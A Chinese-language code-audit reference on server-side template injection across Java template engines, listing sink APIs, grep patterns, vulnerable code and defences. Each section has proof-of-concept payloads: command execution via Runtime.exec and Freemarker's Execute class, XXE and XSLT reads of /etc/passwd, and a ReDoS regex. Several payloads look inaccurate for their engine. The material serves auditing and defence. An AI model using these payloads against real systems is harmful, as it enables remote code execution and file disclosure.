# 模板引擎注入

## 目录

| 子模式 | Sink点API | 严重度 |
|--------|----------|--------|
| §Freemarker | `Configuration.getTemplate()`, `Template.process()` | 高 |
| §Velocity | `Velocity.evaluate()`, `Velocity.mergeTemplate()` | 高 |
| §Thymeleaf | `SpringTemplateEngine.process()`, `ViewResolver.resolve()` | 高 |
| §Pebble | `PebbleEngine.getTemplate()`, `PebbleTemplate.evaluate()` | 高 |
| §Jinjava | `Jinjava.render()`, `Jinjava.renderForResult()` | 高 |
| §GroupTemplate | `GroupTemplate.getTemplate()`, `Template.render()` | 高 |
| §TemplateEngine | `TemplateEngine.process()`, `template.process()` | 高 |
| §MVEL模板 | `MVEL.eval()` (模板模式), `MVELTemplate.execute()` | 中 |
| §XSLT | `TransformerFactory.newTransformer()`, `Templates.newInstance()` | 中 |

---

## §Freemarker

### AP3503.008 Freemarker模板注入

### Sink点

**Sink点Grep模式**:
```
Configuration.getTemplate
Template.process
freemarker.template.Configuration
TemplateModel
StringWriter
```

**LSP回溯示例**:
```java
// Sink点
Configuration cfg = new Configuration();
Template template = cfg.getTemplate(userFileName);  // ← Sink点
template.process(rootMap, out);

// Sink点
Template template = new Template("userTemplate", userInput);
template.process(rootMap, out);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `Configuration`, `getTemplate`, `process`, `TemplateModel`, `${}`, `<#if>`

**危险模式**:
```java
Template template = new Template("userTemplate", userInput);
template.process(rootMap, out);  // SSTI
Template t = cfg.getTemplate(userFileName);  // 文件遍历+SSTI
```

### POC关键片段

```freemarker
${666*777}
${T(java.lang.Runtime).getRuntime().exec('id')}
<#assign ex="freemarker.template.utility.Execute"?new()>${ex('id')}
<#list .data_model?keys as key>${key}</#list>
```

### 防护建议
- 用户输入不直接作为FreeMarker模板内容
- 使用白名单验证模板文件名
- 配置FreeMarker的模板加载器为ClassTemplateLoader
- 禁用`new`内置函数和`Execute`类

---

### AP3503.907 ${}/#{}渲染命令执行

### Sink点

**Sink点Grep模式**:
```
${}
#{}
interpolations
expression
TemplateModel
```

**LSP回溯示例**:
```java
// 用户输入插入插值表达式 - SSTI
Map<String, Object> root = new HashMap<>();
root.put("userName", userInput);  // 用户输入放入模型
template.process(root, out);  // ${userName}会被求值 ← Sink点
```

### 漏洞发现

**grep关键词**: `Interpolation`, `${userInput}`, `${Request}`

**危险模式**:
```freemarker
Hello ${userName}!           <!-- ${}中的userName被求值 -->
${Request['parameter']}     <!-- 直接访问请求参数 -->
${Application['key']}        <!-- 访问application作用域 -->
```

### POC关键片段

```freemarker
${Request?api}
${Application?api}
${__builtin__?resolve("foo")}
<#list .data_model?keys as key>${key}</#list>
```

### 防护建议
- 不要将用户输入直接插入模板插值表达式
- 使用`<#escape>`进行HTML转义(不能防止SSTI)
- 禁用模板中的Java互操作

---

### AP3503.908 Template/TemplateModel

### Sink点

**Sink点Grep模式**:
```
TemplateModel
beans-wrapper
ObjectWrapper
DefaultObjectWrapper
getModel
```

**LSP回溯示例**:
```java
// 危险: 通过ObjectWrapper暴露危险方法
beans_wrapper = configuration.getObjectWrapper();
beans_wrapper.setExposeMethods(true);  // ← Sink点

env.getDataModel().put("user", userObject);  // 用户对象直接暴露
```

### 漏洞发现

**grep关键词**: `ObjectWrapper`, `TemplateModel`, `beans_wrapper`

**危险模式**:
```java
beans_wrapper.setExposeMethods(true);  // 暴露危险方法
env.getDataModel().put("user", userObject);
```

### POC关键片段

```freemarker
${user.getClass().getProtectionDomain().getCodeSource().getLocation().toURI()}
<#assign bw = .vars['com.freemarker.beans.ObjectWrapper']?new()>${bw.PAGE_BEAN}
```

### 防护建议
- 配置FreeMarker使用安全版本的ObjectWrapper
- 不要将危险对象暴露给模板

---

### AP3503.909 NodeModel XXE

### Sink点

**Sink点Grep模式**:
```
NodeModel.parse
XMLParser
XMLConfiguration
SimpleNodeModel
XML Gazetteer
```

**LSP回溯示例**:
```java
// Sink点: 解析用户控制的XML
NodeModel.parse(userXML);  // ← Sink点
SimpleNodeModel.parse(xmlContent);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `NodeModel`, `XMLParser`, `XMLConfiguration`

**危险模式**:
```java
NodeModel.parse(userXML);
Configuration config = new Configuration();
XMLConfiguration xmlConfig = new XMLConfiguration(userXMLFile);
```

### POC关键片段

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### 防护建议
- 不在FreeMarker模板中解析用户控制的XML
- 使用安全的XML解析器配置禁用外部实体

---

### AP3503.910 Matches ReDoS

### Sink点

**Sink点Grep模式**:
```
matches
?matches
Pattern
regex
regular expression
```

**LSP回溯示例**:
```java
// Sink点: 用户输入作为正则
${userInput?matches(pattern)}  // ← Sink点
${longString?matches(".*user.*")}  // ← Sink点 (ReDoS)
```

### 漏洞发现

**grep关键词**: `matches`, `?matches`, `regex`

**危险模式**:
```freemarker
${userInput?matches(pattern)}      <!-- 用户输入作为正则 -->
${email?matches(emailRegex)}      <!-- 邮箱验证 -->
```

### POC关键片段

```freemarker
${userInput?matches("((a+)+)+")}
${longString?matches(".*user.*")}
```

### 防护建议
- 不要将用户输入作为正则表达式的模式
- 使用预编译的安全正则表达式

---

## §Velocity

### AP3503.004 Velocity注入

### Sink点

**Sink点Grep模式**:
```
Velocity.evaluate
Velocity.mergeTemplate
VelocityEngine
Template.process
org.apache.velocity
Context
```

**LSP回溯示例**:
```java
// Sink点
Velocity.evaluate(context, writer, "vm", userInput);  // ← Sink点
Template template = ve.getTemplate(userFileName);  // ← Sink点
template.merge(context, writer);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `Velocity.evaluate`, `mergeTemplate`, `VelocityEngine`

**危险模式**:
```java
Velocity.evaluate(context, writer, "vm", userInput);  // SSTI
Template template = ve.getTemplate(userFileName);  // 文件遍历
template.merge(context, writer);
```

### POC关键片段

```velocity
#set($exp = "T(java.lang.Runtime).getRuntime().exec('id')")
$exp
#parse("userFile.vm")
$velutil.class.methods[0].invoke(null)
```

### 防护建议
- 用户输入不直接作为Velocity模板内容
- 使用白名单限制可加载的模板文件
- 禁用#parse和#include指令

---

## §Thymeleaf

### AP3503.914 视图操纵

### Sink点

**Sink点Grep模式**:
```
SpringTemplateEngine.process
ViewResolver.resolve
setViewName
org.thymeleaf
TemplateEngine
view name
```

**LSP回溯示例**:
```java
// Sink点: 视图名用户可控
templateEngine.process("userViewName", IContext, writer);  // ← Sink点
viewResolver.setViewNames(new String[] {"*"});  // ← Sink点

// 视图名拼接
return "prefix/" + viewName + "/suffix";  // ← Sink点
```

### 漏洞发现

**grep关键词**: `TemplateEngine`, `ViewResolver`, `view name`, `th:text`

**危险模式**:
```java
templateEngine.process(userViewName, context, writer);
viewResolver.setViewNames(new String[] {"*"});  // 允许任意视图名
```

### POC关键片段

```html
<div th:replace="userInput">
__${userInput}__
th:text=${userExpression}
```

### 防护建议
- 视图名使用白名单验证
- 禁用视图名中的表达式求值
- 配置Thymeleaf的视图解析模式

---

## §Pebble

### AP3503.915 Pebble注入

### Sink点

**Sink点Grep模式**:
```
PebbleEngine.getTemplate
PebbleTemplate.evaluate
PebbleService
Loader
com.mitchellbosecke.pebble
```

**LSP回溯示例**:
```java
// Sink点
PebbleEngine engine = new PebbleEngine();
PebbleTemplate template = engine.getTemplate(userFileName);  // ← Sink点
template.evaluate(writer, context);  // ← Sink点

PebbleTemplate compiled = engine.compile(userInput);  // ← Sink点
compiled.evaluate(writer);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `PebbleEngine`, `getTemplate`, `evaluate`

**危险模式**:
```java
PebbleTemplate template = engine.getTemplate(userFileName);
template.evaluate(writer, context);
engine.compile(userInput);
```

### POC关键片段

```pebble
{{ "id"|execute }}
{{ user.name|raw }}
{{ (classLoader.loadClass('java.lang.Runtime')).getMethod('getRuntime').invoke(null) }}
```

### 防护建议
- 用户输入不直接作为Pebble模板内容
- 使用白名单限制可加载的模板
- 禁用过滤器链中的危险过滤器

---

## §Jinjava

### AP3503.916 Jinjava注入

### Sink点

**Sink点Grep模式**:
```
Jinjava.render
Jinjava.renderForResult
renderFile
interpret
com.hubspot.jinjava
```

**LSP回溯示例**:
```java
// Sink点
Jinjava jinjava = new Jinjava();
String result = jinjava.render(userInput, context);  // ← Sink点
String result = jinjava.renderFile(userFileName, context);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `Jinjava`, `render`, `renderForResult`

**危险模式**:
```java
Jinjava jinjava = new Jinjava();
jinjava.render(userInput, context);
jinjava.renderFile(userFileName, context);
```

### POC关键片段

```jinja2
{{ "id"|exec }}
{{ request.getClass().getClassLoader() }}
{{ ""|class.doConstruct }}
```

### 防护建议
- 用户输入不直接作为Jinjava模板
- 使用Jinjava的安全配置禁用危险标签
- 白名单限制可导入的模块

---

## §GroupTemplate

### AP3503.917 GroupTemplate注入

### Sink点

**Sink点Grep模式**:
```
GroupTemplate.getTemplate
Template.render
org.beetl.core
Resource
gnrt
```

**LSP回溯示例**:
```java
// Sink点
GroupTemplate gt = new GroupTemplate();
Template t = gt.getTemplate(userFileName);  // ← Sink点
t.render(context, writer);  // ← Sink点

Template template = new Template(userInput);
template.render(context, writer);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `GroupTemplate`, `Template`, `render`, `beetl`

**危险模式**:
```java
GroupTemplate gt = new GroupTemplate();
Template t = gt.getTemplate(userFileName);
t.render(context, writer);
```

### POC关键片段

```beetl
${Runtime.getRuntime().exec('id')}
<% println(java.lang.Runtime.getRuntime().exec('id')); %>
```

### 防护建议
- 用户输入不直接作为beetl模板
- 配置GroupTemplate的安全资源加载器
- 禁用<% %>脚本块执行

---

## §TemplateEngine

### AP3503.913 TemplateEngine注入

### Sink点

**Sink点Grep模式**:
```
TemplateEngine.process
template.process
engine.render
StringTemplate
Template
org.apache.struts2.views
```

**LSP回溯示例**:
```java
// Sink点: 通用模板引擎处理用户输入
templateEngine.process(userTemplate, context, writer);  // ← Sink点

Template template = new Template(userInputString, reader);
template.process(context, writer);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `TemplateEngine`, `process`, `template.process`

**危险模式**:
```java
templateEngine.process(userTemplate, context, writer);
Template template = new Template(userInputString, reader);
template.process(context, writer);
```

### POC关键片段

```html
${T(java.lang.Runtime).getRuntime().exec('id')}
{{"id"|exec}}
<%= Runtime.getRuntime().exec('id') %>
```

### 防护建议
- 用户输入不直接作为模板内容
- 模板引擎使用安全配置
- 白名单限制模板中可访问的类和方法

---

## §MVEL模板

### AP3503.009 MVEL模板注入

### Sink点

**Sink点Grep模式**:
```
MVEL.eval
MVELTemplate
org.mvel2
TemplateRuntime
executeExpression
```

**LSP回溯示例**:
```java
// Sink点: MVEL模板渲染用户输入
String result = MVEL.eval(userTemplate, context);  // ← Sink点
MVELTemplate template = new MVELTemplate(userTemplate);  // ← Sink点
template.execute(context);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `MVEL`, `MVELTemplate`, `TemplateRuntime`

**危险模式**:
```java
MVEL.eval(userTemplate, context);
new MVELTemplate(userTemplate).execute(context);
```

### POC关键片段

```java
@{java.lang.Runtime.getRuntime().exec('id')}
@{(new java.lang.ProcessBuilder('id')).start()}
@{System.getProperty('user.dir')}
```

### 防护建议
- 用户输入不直接作为MVEL模板
- 使用MVEL的安全配置限制可访问的类
- 白名单验证模板内容

---

## §XSLT

### AP3503.006 XSLT注入

### Sink点

**Sink点Grep模式**:
```
TransformerFactory.newTransformer
Templates.newInstance
Transformer.transform
Stylesheet
XSLT
XMLConstants
```

**LSP回溯示例**:
```java
// Sink点: XSLT处理用户样式表
TransformerFactory factory = TransformerFactory.newInstance();
Transformer transformer = factory.newTransformer(new StreamSource(userXsltFile));  // ← Sink点
transformer.transform(source, result);  // ← Sink点
```

### 漏洞发现

**grep关键词**: `TransformerFactory`, `Transformer`, `Templates`

**危险模式**:
```java
Transformer transformer = factory.newTransformer(new StreamSource(userXsltFile));
transformer.transform(source, result);
factory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "all");
```

### POC关键片段

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:value-of select="unparsed-entity-available('xxe')"/>
</xsl:stylesheet>
```

```java
<xsl:value-of select="document('/etc/passwd')"/>
```

### 防护建议
- 用户输入不直接作为XSL样式表
- 禁用TransformerFactory的外部实体访问
- 使用白名单验证XSL文件来源